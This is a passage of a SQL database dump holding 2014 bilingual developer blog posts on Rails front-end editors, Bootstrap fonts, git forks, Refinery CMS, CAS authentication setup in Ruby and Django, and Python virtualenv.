中的图标独立出去了，而且不再是png，而是 fonts.  所以，我们要特殊处理一下。 (the plyphicon is extacted from bootstrap3 as kinda of FONT, so we have to modify the bootstrap css file )</p> \r\n<pre>1. copy fonts folder from bootstrap3 to your rails app.\r\n2. modify the bootstrap.css:  (notice, url is: /assets, but not /assets/fonts ) \r\n@font-face {\r\n  font-family: \'Glyphicons Halflings\';\r\n  src: url(\'/assets/glyphicons-halflings-regular.eot\');\r\n  src: url(\'/assets/glyphicons-halflings-regular.eot?#iefix\') format(\'embedded-opentype\'), url(\'/assets/glyphicons-halflings-regular.woff\') format(\'woff\'), url(\'/assets/glyphicons-halflings-regular.ttf\') format(\'truetype\'), url(\'/assets/glyphicons-halflings-regular.svg#glyphicons_halflingsregular\') format(\'svg\'); \r\n}\r\n\r\n</pre>',0,'2014-01-31 01:20:00','2014-01-31 01:24:58','2014-01-31 01:24:58',1,NULL,'display-bootstrap-plyphicons-in-rails3-or-4','','','',539,'display-bootstrap-plyphicons-in-rails3-or-4'),(202,'rails4中使用wysihtml5 editor (using wysihtml5 editor in rails4)','<p>NOTICE: please use tinymce instead. ( 请使用 tinymce), refer to: <a href=\"http://siwei.me/blog/posts/using-tinymce-in-rails\" target=\"_blank\">http://siwei.me/blog/posts/using-tinymce-in-rails</a>\r\n</p>\r\n<p>steps:</p>\r\n<p>1. download the source code from <a href=\"https://github.com/xing/wysihtml5/wiki/Getting-Started\" target=\"_blank\">official website</a>\r\n</p>\r\n<p>2. in your page:\r\n</p>\r\n<pre>&lt;script src=\"/path-to-wysihtml5/parser_rules/advanced.js\"&gt;\r\n&lt;script src=\"/path-to-wysihtml5/dist/wysihtml5-0.3.0.min.js\"&gt;\r\n</pre>\r\n<p> create the tool bar\r\n</p>\r\n<pre>    &lt;div id=\"wysihtml5-toolbar\" style=\'display:none;\'&gt;\r\n      &lt;header&gt;\r\n        &lt;ul class=\"commands\"&gt;\r\n          &lt;li data-wysihtml5-command=\"bold\" title=\"Make text bold (CTRL + B)\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"italic\" title=\"Make text italic (CTRL + I)\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"insertUnorderedList\" title=\"Insert an unordered list\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"insertOrderedList\" title=\"Insert an ordered list\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"createLink\" title=\"Insert a link\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"insertImage\" title=\"Insert an image\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"formatBlock\" data-wysihtml5-command-value=\"h1\" title=\"Insert headline 1\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"formatBlock\" data-wysihtml5-command-value=\"h2\" title=\"Insert headline 2\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-command-group=\"foreColor\" class=\"fore-color\" title=\"Color the selected text\" class=\"command\"&gt;\r\n            &lt;ul&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"silver\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"gray\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"maroon\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"red\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"purple\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"green\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"olive\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"navy\"&gt;&lt;/li&gt;\r\n              &lt;li data-wysihtml5-command=\"foreColor\" data-wysihtml5-command-value=\"blue\"&gt;&lt;/li&gt;\r\n            &lt;/ul&gt;\r\n          &lt;/li&gt;\r\n          &lt;li data-wysihtml5-command=\"insertSpeech\" title=\"Insert speech\" class=\"command\"&gt;&lt;/li&gt;\r\n          &lt;li data-wysihtml5-action=\"change_view\" title=\"Show HTML\" class=\"action\"&gt;&lt;/li&gt;\r\n        &lt;/ul&gt;\r\n      &lt;/header&gt;\r\n      &lt;div data-wysihtml5-dialog=\"createLink\" style=\"display: none;\"&gt;\r\n        &lt;label&gt;\r\n          Link:\r\n          &lt;input data-wysihtml5-dialog-field=\"href\" value=\"http://\"&gt;\r\n        &lt;/label&gt;\r\n        &lt;a data-wysihtml5-dialog-action=\"save\"&gt;OK&lt;/a&gt;&#160;&lt;a data-wysihtml5-dialog-action=\"cancel\"&gt;Cancel&lt;/a&gt;\r\n      &lt;/div&gt;\r\n\r\n      &lt;div data-wysihtml5-dialog=\"insertImage\" style=\"display: none;\"&gt;\r\n        &lt;label&gt;\r\n          Image:\r\n          &lt;input data-wysihtml5-dialog-field=\"src\" value=\"http://\"&gt;\r\n        &lt;/label&gt;\r\n        &lt;a data-wysihtml5-dialog-action=\"save\"&gt;OK&lt;/a&gt;&#160;&lt;a data-wysihtml5-dialog-action=\"cancel\"&gt;Cancel&lt;/a&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n</pre>\r\n<p>use this css file: &#160;(save as: &#160;wysihtml5.css )</p>\r\n<pre>#wysihtml5-editor-toolbar {\r\n  position: relative;\r\n}\r\n\r\nheader {\r\n  display: block;\r\n  border-radius: 4px;\r\n  width: 810px;\r\n  background: #f6f6f6;\r\n  position: relative;\r\n  z-index: 1;\r\n  text-align: center;\r\n  border: 1px solid #ddd\\9; /* IE 8 and below */\r\n  background-image: linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);\r\n  background-image: -o-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);\r\n  background-image: -moz-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);\r\n  background-image: -webkit-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);\r\n  background-image: -ms-linear-gradient(bottom, rgb(238,238,238) 0%, rgb(255,255,255) 100%);\r\n  box-shadow: 0 0 4px 1px rgba(0, 0, 0, 0.3);\r\n  font-size: 0;\r\n  text-align: center;\r\n}\r\n\r\n.commands {\r\n  border-left: 1px solid #ddd;\r\n  display: inline-block;\r\n}\r\n\r\n[data-wysihtml5-command],\r\n[data-wysihtml5-action],\r\n.fore-color {\r\n  position: relative;\r\n  border-right: 1px solid #ddd;\r\n  border-left: 1px solid #fff;\r\n  list-style: none;\r\n  font-size: 12px;\r\n  display: inline-block;\r\n  cursor: pointer;\r\n  height: 40px;\r\n  width: 68px;\r\n}\r\n\r\n[data-wysihtml5-command]:after,\r\n[data-wysihtml5-action]:after,\r\n.fore-color:after {\r\n  content: \"\";\r\n  background-image: url(../img/spr_toolbar_icons_r1.png);\r\n  background-repeat: no-repeat;\r\n  position: absolute;\r\n  left: 0;\r\n  right: 0;\r\n  top: 0;\r\n  bottom: 0;\r\n}\r\n\r\n[data-wysihtml5-command]:hover,\r\n[data-wysihtml5-action]:hover,\r\n.fore-color:hover {\r\n  background-image: linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);\r\n  background-image: -o-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);\r\n  background-image: -moz-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);\r\n  background-image: -webkit-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);\r\n  background-image: -ms-linear-gradient(bottom, rgb(229,240,226) 0%, rgb(255,255,255) 100%);\r\n}\r\n\r\n[data-wysihtml5-command=\"bold\"]:after {\r\n  background-position: 24px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"italic\"]:after {\r\n  background-position: -48px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"insertUnorderedList\"]:after {\r\n  background-position: -115px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"insertOrderedList\"]:after {\r\n  background-position: -197px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"formatBlock\"][data-wysihtml5-command-value=\"h1\"]:after {\r\n  background-position: -344px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"formatBlock\"][data-wysihtml5-command-value=\"h2\"]:after {\r\n  background-position: -428px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"createLink\"]:after {\r\n  background-position: -271px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"insertImage\"]:after {\r\n  background-position: -513px center;\r\n}\r\n\r\n.fore-color:after {\r\n  background-position: -741px center;\r\n}\r\n\r\n[data-wysihtml5-command=\"insertSpeech\"]:after {\r\n  background-position: -596px center;\r\n}\r\n\r\n[data-wysihtml5-action=\"change_view\"]:after {\r\n  background-position: -670px center;\r\n}\r\n\r\n.fore-color ul {\r\n  display: none;\r\n  position: absolute;\r\n  z-index: 2;\r\n  top: 40px;\r\n  right: -1px;\r\n  left: -2px;\r\n  border: 1px solid #ccc;\r\n  border-top: 0;\r\n  background: #fff;\r\n  overflow: hidden;\r\n}\r\n\r\n.fore-color li {\r\n  display: block;\r\n  margin: 3px;\r\n  width: auto;\r\n  border: 0;\r\n  height: 15px;\r\n}\r\n\r\n.fore-color li:after {\r\n  display: none;\r\n}\r\n\r\n.fore-color:hover ul {\r\n  display: block;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"silver\"] {\r\n  background: silver !important;\r\n}\r\n\r\n\r\n.fore-color [data-wysihtml5-command-value=\"gray\"] {\r\n  background: gray !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"maroon\"] {\r\n  background: maroon !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"red\"] {\r\n  background: red !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"purple\"] {\r\n  background: purple !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"green\"] {\r\n  background: green !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"olive\"] {\r\n  background: olive !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"navy\"] {\r\n  background: navy !important;\r\n}\r\n\r\n.fore-color [data-wysihtml5-command-value=\"blue\"] {\r\n  background: blue !important;\r\n}\r\n\r\n.fore-color .wysihtml5-command-active {\r\n  outline: 1px solid #666;\r\n  outline-offset: 1px;\r\n}\r\n\r\n.wysihtml5-commands-disabled .fore-color ul {\r\n  display: none;\r\n}\r\n\r\n.wysihtml5-action-active,\r\n.wysihtml5-command-active {\r\n  box-shadow: inset 0 1px 6px rgba(0, 0, 0, 0.2);\r\n  background: #eee !important;\r\n}\r\n\r\n.wysihtml5-commands-disabled [data-wysihtml5-command],\r\n.wysihtml5-commands-disabled .fore-color {\r\n  opacity: 0.4;\r\n  cursor: default;\r\n  background-image: none !important;\r\n}\r\n\r\n[data-wysihtml5-dialog] {\r\n  color: #333;\r\n  font-size: 14px;\r\n  text-align: left;\r\n  border-radius: 4px;\r\n  -ms-box-sizing: border-box;\r\n  -webkit-box-sizing: border-box;\r\n  -moz-box-sizing: border-box;\r\n  box-sizing: border-box;\r\n  border: 1px solid #ccc;\r\n  padding: 5px 10px;\r\n  background: #FFFBE0;\r\n  position: absolute;\r\n  width: 810px;\r\n  text-align: center;\r\n  top: 45px;\r\n}\r\n\r\n[data-wysihtml5-dialog] input {\r\n  color: #333;\r\n  border: 1px solid #ccc;\r\n  padding: 3px;\r\n  width: 300px;\r\n}\r\n\r\n[data-wysihtml5-dialog] input:focus {\r\n  outline: 0;\r\n  border: 1px solid #666;\r\n}\r\n\r\n[data-wysihtml5-dialog-action] {\r\n  padding: 4px;\r\n  color: #fff;\r\n  cursor: pointer;\r\n}\r\n\r\n[data-wysihtml5-dialog-action=\"save\"] {\r\n  background: #007200;\r\n}\r\n\r\n[data-wysihtml5-dialog-action=\"cancel\"] {\r\n  background: #999;\r\n}\r\n</pre>\r\n\r\n\r\n<p>3. init the js script\r\n</p>\r\n<pre>&lt;script&gt;\r\nvar editor = new wysihtml5.Editor(\"wysihtml5-textarea\", { // id of textarea element\r\n  toolbar:      \"wysihtml5-toolbar\", // id of toolbar element\r\n  parserRules:  wysihtml5ParserRules // defined in parser rules set \r\n});\r\n&lt;/script&gt;\r\n</pre>\r\n\r\n<p>4. $ wget&#160;http://xing.github.io/wysihtml5/img/spr_toolbar_icons_r1.png, copy it to /app/assets/images \r\n</p>\r\n<pre>$ mv spr_toolbar_icons_r1.png <your_rails_folder>/app/assets/images/wysihtml5_toolbar_icons.png\r\n</your_rails_folder></pre>\r\n\r\n<p>5. edit wysihtml5.css:</p>\r\n\r\nchange:  url(../img/spr_toolbar_icons_r1.png);\r\nto:  url(\'/assets/wysihtml5_toolbar_icons.png\');\r\n\r\n<p>6. another css </p>\r\n<pre>html {\r\n  background: transparent;\r\n}\r\n\r\nbody {\r\n  margin-bottom: 25px;\r\n}\r\n\r\nh1, h2 {\r\n  line-height: 1;\r\n  font-family: Rockwell, \"Courier New\", Courier, Georgia;\r\n  border-bottom: 1px solid #999;\r\n  font-weight: bold;\r\n  margin: 0 5px 25px 0;\r\n  padding: 0 0 8px;\r\n}\r\n\r\nh1 {\r\n  font-size: 27px;\r\n}\r\n\r\nh2 {\r\n  font-size: 18px;\r\n}\r\n\r\np, li {\r\n  line-height: 1.5;\r\n}\r\n\r\np, ul, ol {\r\n  padding-bottom: 25px;\r\n}\r\n\r\na {\r\n  color: inherit;\r\n}\r\n\r\nstrong, b {\r\n  font-weight: bold;\r\n}\r\n\r\ni, em {\r\n  font-style: italic;\r\n}\r\n\r\nli {\r\n  margin-left: 30px;\r\n}\r\n\r\nul li {\r\n  list-style: disc outside;\r\n}\r\n\r\nol li {\r\n  list-style: decimal outside;\r\n}\r\n\r\nli img {\r\n  vertical-align: middle;\r\n  margin: 2px 5px 5px 0;\r\n}\r\n\r\n.wysiwyg-color-black {\r\n  color: black;\r\n}\r\n\r\n.wysiwyg-color-silver {\r\n  color: silver;\r\n}\r\n\r\n.wysiwyg-color-gray {\r\n  color: gray;\r\n}\r\n\r\n.wysiwyg-color-white {\r\n  color: white;\r\n}\r\n\r\n.wysiwyg-color-maroon {\r\n  color: maroon;\r\n}\r\n\r\n.wysiwyg-color-red {\r\n  color: red;\r\n}\r\n\r\n.wysiwyg-color-purple {\r\n  color: purple;\r\n}\r\n\r\n.wysiwyg-color-fuchsia {\r\n  color: fuchsia;\r\n}\r\n\r\n.wysiwyg-color-green {\r\n  color: green;\r\n}\r\n\r\n.wysiwyg-color-lime {\r\n  color: lime;\r\n}\r\n\r\n.wysiwyg-color-olive {\r\n  color: olive;\r\n}\r\n\r\n.wysiwyg-color-yellow {\r\n  color: yellow;\r\n}\r\n\r\n.wysiwyg-color-navy {\r\n  color: navy;\r\n}\r\n\r\n.wysiwyg-color-blue {\r\n  color: blue;\r\n}\r\n\r\n.wysiwyg-color-teal {\r\n  color: teal;\r\n}\r\n\r\n.wysiwyg-color-aqua {\r\n  color: aqua;\r\n}\r\n</pre>\r\n<p>7. change the init js code </p>\r\n<pre>    &lt;%= render :partial =&gt; \'layouts/wysihtml5_toolbar\' %&gt;\r\n    &lt;%= f.text_area :content, {:style=&gt;\'width:810px; height: 1000px\', :id =&gt; \'wysihtml5-textarea\'} %&gt;\r\n\r\n&lt;%= coffee_script_tag do %&gt;\r\n$ -&gt;\r\n  editor = new wysihtml5.Editor \"wysihtml5-textarea\",\r\n    toolbar:      \"wysihtml5-toolbar\",\r\n    parserRules:  wysihtml5ParserRules\r\n    stylesheets: [\'/assets/wysihtml5\', \'/assets/wysihtml5-reset-min\', \'/assets/wysihtml5_editor\' ]\r\n&lt;% end %&gt;\r\n\r\n</pre>',0,'2014-01-31 07:41:00','2014-01-31 07:44:48','2014-02-01 07:31:56',1,NULL,'using-wysihtml5-in-rails4','','','',458,'using-wysihtml5-in-rails4'),(203,'tinymce --- another good wysiwyg editor (rails中使用tinymce) ','<p>在rails 中的使用方式： 建议使用 gem 来做。否则一点儿一点儿的copy assets ，很麻烦。(it\'s strongly recommended we use the gem instead of adding files to app/assets image/stylesheets manually. </p>\r\n<p>see: <a href=\"https://github.com/spohlenz/tinymce-rails/tree/tinymce-4\" target=\"_blank\">https://github.com/spohlenz/tinymce-rails/tree/tinymce-4</a>\r\n</p>\r\n<p>p.s. my tinymce.yml:&#160;</p>\r\n<pre>siwei@siwei-Lenovo-V470c:/workspace/rails_girls_cn$ cat config/tinymce.yml \r\ntheme_advanced_toolbar_location: top\r\ntheme_advanced_toolbar_align: left\r\ntheme_advanced_statusbar_location: bottom\r\ntheme_advanced_buttons3_add:\r\n  - tablecontrols\r\n  - fullscreen\r\nplugins:\r\n  - table\r\n  - fullscreen\r\n  - code\r\n  - contextmenu\r\n  - image\r\n  - link\r\n  - preview\r\n  - charmap\r\n\r\n</pre>',0,'2014-02-01 07:28:00','2014-02-01 07:30:41','2014-02-01 07:33:56',1,NULL,'using-tinymce-in-rails','','','',766,'using-tinymce-in-rails'),(204,'tooltip:  jquery-ui v.s. bootstrap (注意： bootstrap 与 jquery-ui 的tooltip组件会起冲突！导致bootstrap tooltip不生效～)','<p>如题。 如果你同时使用了jquery-ui 与 bootstrap, 那么只有 jquery-ui对应的tooltip组件才会生效！！！ ( you can\'t use the tooltip from bootstrap if already using jquery-ui )&#160;</p>',0,'2014-02-01 08:02:00','2014-02-01 08:04:13','2014-02-01 08:04:13',1,NULL,'tooltip-war-jquery-ui-override-bootstrap','','','',608,'tooltip-war-jquery-ui-override-bootstrap'),(205,'remove blank lines in VIM','<p>&#160;:g/^$/d</p>\r\n<p>:g will execute a command on lines which match a regex. The regex is \'blank line\' and the command is :d (delete)</p>\r\n<p> refer to: <a href=\"http://stackoverflow.com/questions/706076/vim-delete-blank-lines\" target=\"_blank\">http://stackoverflow.com/questions/706076/vim-delete-blank-lines</a>\r\n</p>',0,'2014-02-02 10:18:00','2014-02-02 10:19:15','2014-02-02 10:22:58',1,NULL,'remove-blank-lines-in-vim','','','',399,'remove-blank-lines-in-vim'),(206,'如何将fork的project 更新到最新（how to make your forked project to up-to-date. )','<p>我有个项目，去年forked，今年重新捡起来，打算弄一下。( Today I am going to continue one of my forked projects that created last year)</p>\r\n<p>git的原理是： 在远程可以有多个 repo (最熟悉的就是 origin 啦). 所以，我们只要加入想merge的 remote &#160;repo就可以了。( To make its code to the latest, I have to merge the original remote repo to my remote repo. )</p>\r\n<pre>$ git remote add root_origin https://github.com/refinery/refinerycms.git\r\n$ git pull root_origin master:master ( means merge the master from root_origin to local\'s master)\r\n$ (manually merge) \r\n$ git push origin master:master( push local\'s commits to your origin remote repo)\r\n</pre>\r\n<p>refer to : <a href=\"http://stackoverflow.com/questions/9529497/what-is-origin-in-git\" target=\"_blank\">http://stackoverflow.com/questions/9529497/what-is-origin-in-git</a>\r\n</p>',0,'2014-02-05 00:47:00','2014-02-05 00:58:53','2014-02-05 00:59:26',1,NULL,'how-to-make-your-forked-project-to-update-to-date','','','',490,'how-to-make-your-forked-project-to-update-to-date'),(207,'install refinery_cms using mysql','<p>refinery_cms is not bad. I have been using it for my personal website(siwei.me, aka shensiwei.com), its default database is sqlite3. this guide will show you how to install it under mysql.</p>\r\n<p>step1. $ gem install refinery cms &#160;(following it official guide)</p>\r\n<p>step1.1 $ gem install sass-rails -v 3.2.3&#160;</p>\r\n<p>setp1.2 $&#160;apt-get install libsqlite3-dev&#160;</p>\r\n<p>step 1.9 $ refinerycms yangqigong (using the &#160;default settings)</p>\r\n<p>step2. $ vim Gemfile , config/database.yml, using mysql content. e.g.</p>\r\n<pre># Gemfile:\r\n gem \'rails\', \'3.2.15\'\r\n gem \'mysql2\', \'0.2.6\'\r\n\r\n# database.yml\r\ndevelopment:\r\n  adapter: mysql2\r\n  encoding: utf8\r\n  reconnect: false\r\n  database: yangqigong_development\r\n  #database: yangqigong_development_two\r\n  pool: 5\r\n  username: root\r\n  password: \"\"\r\n  host: localhost</pre>\r\n<p>Step3. $ bundle install &amp;&amp; bundle exec rake db:create &amp;&amp; bundle exec rake db:migrate</p>\r\n<p>it\'s done. run \'bundle exec rails s\' will start your application.&#160;</p>',0,'2014-02-05 01:26:00','2014-02-05 01:32:07','2014-02-05 05:08:32',1,NULL,'install-refinery_cms-using-mysql','','','',404,'install-refinery_cms-using-mysql'),(208,'selecting a web host(如何选择主机，主机空间, web host)','<p>refer to <a href=\"http://stackoverflow.com/questions/2339324/selecting-a-rails-host/21640941#21640941\" target=\"_blank\">http://stackoverflow.com/questions/2339324/selecting-a-rails-host/21640941#21640941</a>\r\n</p><p>简言之， 忘记heroku, 尽情的使用linode吧， 260块钱一个月，2G内存， 用起来跟独立的机器一样。 而HEROKU把太多LINUX 的功能抽取出了service, 用起来不方便，而且一旦脱离了heroku 环境，你发现自己将失去一切。 &#160;</p>\r\n<p>linode 使你成为 前途光明的 LINUX 专家。&#160;<br />heroku 把你死死的绑在它的船上。</p>\r\n<p>I prefer linode, aws or so.</p>\r\n<p>linode : is a standard linux server. you can login, install 3rd party dependencies and play around just like in your own server. Installing nginx/rails/ruby is the same way as what you did on your own pc/laptop/server.</p>\r\n<p>heroku : is a service. I have learn lots of stuffs that is not valuable if one day you switch to another platform(e.g. linode) or you have your own real server. for example, check the logs, install databases, or install gems. I have printed out most of its documents and read them in 1/2 days, and then I realize that I can\'t use this knowledges in my working server( that my company offered to me)</p>\r\n<p>linode is cheap enough, $20 per month.</p>\r\n<p>heroku is not always free. and I don\'t think it\'s stable enough for demonstration purpose.(e.g. your free heroku app will fall in sleep in spare time, and will cost your several seconds to wake up. this SEVERAL seconds is long enough to make you lost your customers if they want FAST web app )<br />so, forget heroku, buy or setup your own VPS, use it for years, then you will be an linux expert.</p>\r\n',0,'2014-02-08 01:58:00','2014-02-08 02:02:06','2014-02-08 02:02:06',1,NULL,'selecting-a-web-host','','','',396,'selecting-a-web-host'),(209,'搭建CAS 的简要步骤（ setup your CAS )','<p>copied from our wiki page. in Chinese. &#160;</p>\r\n<p>搭建步骤<br />1. 取出代码</p>\r\n<p> $git clone ssh://&lt;换成你的用户名&gt;@gforge.1verge.net:22022/gitroot/m-cas<br />2. cd rubycas-server</p>\r\n<p>3. cp config/config.example.yml config.yml</p>\r\n<p>4. 编辑config.yml ， 这个是最核心的配置，里面的项目很多，但是注释的很全面，所以理解起来很快。</p>\r\n<p>4.1 Change the database driver to mysql2<br />4.2 最少要有一个认证方式（Authenticator) Configure at least one authenticator<br />4.3 （可选）You might want to change log.file to something local, so that you don\'t need root. For example just casserver.log<br />4.4 （可选）You might also want to disable SSL for now by commenting out the ssl_cert line and changing the port to something like 8888<br />5. 建立数据库 (记得跟config.yml 文件一致）</p>\r\n<p>  $ mysqladmin -u root create casserver  <br />6. 修改现有的Gemfile.</p>\r\n<p>gem \"mysql2\"  <br />gem \"radiustar\"   # 我们使用 RADIUS的认证方式<br />7. $ bundle install:</p>\r\n<p>8. $ bundle exec rubycas-server -c config.yml</p>\r\n<p>9. 增加新的 authenticator .</p>\r\n<p>1. $ copy the RADIUS directory files. <br />2. $ write the authenticate.rb file .e.g.<br />#  lib/authentication_tool.rb<br />require \'rubygems\'<br />require \'radiustar\'<br />class AuthenticationTool<br />  RADIUT_CLIENT_IP = \'10.103.13.121\'<br />  RADIUT_SERVER_IP = \'10.10.0.20\'<br />  PUBLIC_KEY = \'YoukuRadius\'<br />  DIRECTORY_FOLDER = \'/opt/app/ruby/rubycas-server/lib/radius_dictionary_folder\'<br />  def self.authenticate_using_radiut username, password<br />    auth_custom_attr = { \'NAS-IP-Address\' =&gt; RADIUT_CLIENT_IP }<br /> <br />    req = Radiustar::Request.new(RADIUT_SERVER_IP,<br />      { :dict =&gt; Radiustar::Dictionary.new(DIRECTORY_FOLDER) })<br /> <br />    begin<br />      reply = req.authenticate(username, password, PUBLIC_KEY, auth_custom_attr)<br />      #reply example: {:code=&gt;\"Access-Accept\", \"Framed-Protocol\"=&gt;PPP, \"Service-Type\"=&gt;Framed-User, \"Class<br />      puts \"== Radiut reply : #{reply.inspect}\"<br />      return reply[:code] == \'Access-Accept\'<br />    rescue Exception =&gt; e<br />      puts \"== exception: #{e.inspect}\"<br />      puts \"== #{e.backtrace.join(\"\\n\")}\"<br />      return false<br />    end <br />  end <br />end<br />3. 增加 这个文件：</p>\r\n<p># lib/casserver/authenticators/radius.rb<br />require \'rubygems\'<br />require \'radiustar\'<br />require \'authentication_tool\'<br />require \'casserver/authenticators/base\'<br /> <br /># 定制的Radius 验证<br />module CASServer<br />    module Authenticators<br />        class Radius &lt;<br />            CASServer::Authenticators::Base<br />          def validate(credentials)<br />            read_standard_credentials(credentials)<br />            return false if @password.blank?<br />            return AuthenticationTool.authenticate_using_radiut(@username, @password)<br />          end<br />        end<br />    end<br />end<br />4. 为 lib/casserver.rb 加上一行：</p>\r\n<p>CASServer::Authenticators.autoload :Radius, \'casserver/authenticators/radius.rb\'</p>',0,'2014-02-10 00:58:00','2014-02-10 01:00:17','2014-02-10 01:00:17',1,NULL,'setup-your-cas','','','',458,'setup-your-cas'),(210,'在RAILS中使用CAS 客户端（ cas client for rails) ','<p>Ruby 客户端 使用方法<br />0. 在 Gemfile中，加入：</p>\r\n<p>gem \'rubycas-client\'<br />然后 $sudo bundle</p>\r\n<p>注意： 不要使用 \'rubycas-client-rails\' 这个GEM。这个gem会使得你的配置过程不透明，难于调试。<br />1. environment.rb: 的结尾，加上：</p>\r\n<p>CASClient::Frameworks::Rails::Filter.configure(<br />  :cas_base_url =&gt; \"http://10.103.13.121:333\"<br />)<br />2 对应的controller 中， 加上：</p>\r\n<p>before_filter CASClient::Frameworks::Rails::Filter<br />注意： 不要在 application_controller中加这句。否则的话所有的controller, 包括登录页面都会受影响。<br />3. 在sessions_controller.rb 中定义退出的action:</p>\r\n<p>class SessionsController &lt; ApplicationController<br />  def destroy<br />    CASClient::Frameworks::Rails::Filter.logout(self)<br />  end<br />end<br />4. 修改 route.rb ，加入退出的链接：</p>\r\n<p>PaddyField::Application.routes.draw do<br />   resources :fish<br />   match \'/logout\' =&gt; \"sessions#destroy\", :as =&gt; :logout, :via =&gt; :delete<br />end <br />5. 修改 application.html.erb 布局文件，增加这个链接。</p>\r\n<p>关键的一点是： 在经典的rails authorization 框架用，都是用 current_user 这个变量取得当前登陆的用户。 在CAS CLIENT中，用的是 session[:cas_user] , 只取得当前用户名，是一个string. 而不是一个model.<br />&lt;div style=\"border: 1px solid green\"&gt;<br />  &lt;%= session[:cas_user] %&gt; <br />&lt;/div&gt;<br />&lt;% if session[:cas_user] %&gt;<br />  &lt;%= link_to \"logout\" , logout_path %&gt; <br />&lt;% end %&gt;</p>',0,'2014-02-10 01:00:00','2014-02-10 01:01:31','2014-02-10 01:01:31',1,NULL,'cas-client-for-rails','','','',527,'cas-client-for-rails'),(211,'virtual env 的使用。 python 环境的切换 ( using virtualenv as python development environment )','<p>工作中需要用到 python ( django, pyramid ) , 深感 自己 python知识的浅薄，所以记录下来。</p>\r\n\r\n<pre>pip install virtualenv\r\nmkdir django_env\r\ncd django_env\r\nvirtualenv --no-site-packages django_env\r\ncd django_env\r\nsource bin/activate\r\n</pre>\r\n<p>run server:</p>\r\n<p>$&#160;django-admin.py runserver&#160;</p>',0,'2014-02-13 06:48:00','2014-02-13 06:55:34','2014-02-13 10:00:48',1,NULL,'using-virtualenv-for-python-development','','','',493,'using-virtualenv-for-python-development'),(212,'使用django-cas (using django-cas)','<p>步骤：</p>\r\n<p>$ git clone &lt;your project&gt; &amp;&amp; cd &lt;your project&gt;</p>\r\n<p>$ load your virtualenv for python&#160;</p>\r\n<p>$ hg clone https://bitbucket.org/cpcc/django-cas\r\n</p>\r\n<p>$ python setup.py install\r\n</p>\r\n<p>$&#160;pip install MySQL-python\r\n</p>\r\n<p>if you met problems installing python-dev in ubuntu13, try this approach:&#160;<br />$ echo \"deb http://us.archive.ubuntu.com/ubuntu/ precise-updates main restricted\" | sudo tee -a /etc/apt/sources.list.d/precise-updates.list<br />sudo apt-get update<br />sudo apt-get install python2.7-dev</p>\r\n<p>$ use django\'s auth module, even if you are using mongodb. (see: <a href=\"https://docs.djangoproject.com/en/dev/topics/auth/\" target=\"_blank\">https://docs.djangoproject.com/en/dev/topics/auth/</a> )setup your local database: </p>\r\n<pre>$ create a database named \'m_tv_box_ms\'\r\n$ create a table named \'user\'\r\n$ \r\n</pre>\r\n<p>$ 向 settings.py 中加入以下内容：\r\n</p>\r\n<pre># tv_cms/manage.py:\r\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"tv_cms.settings\")\r\n\r\n# tv_cms/wsgi.py:\r\nos.environ[\'DJANGO_SETTINGS_MODULE\'] = \'tv_cms.settings\'\r\n\r\n# tv_cms/tv_cms/wsgi.py\r\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"tv_cms.settings\")\r\n</pre>\r\n<p>== Installation == (follow <a href=\"https://bitbucket.org/cpcc/django-cas/\" target=\"_blank\">https://bitbucket.org/cpcc/django-cas/</a> )&#160;</p>\r\n<p>Run `python setup.py install`, or place the `django_cas` directory in your<br />`PYTHONPATH` directly. (Note: If you\'re using Python 2.4 or older, you\'ll need<br />to install [http://pypi.python.org/pypi/elementtree/ ElementTree] to use<br 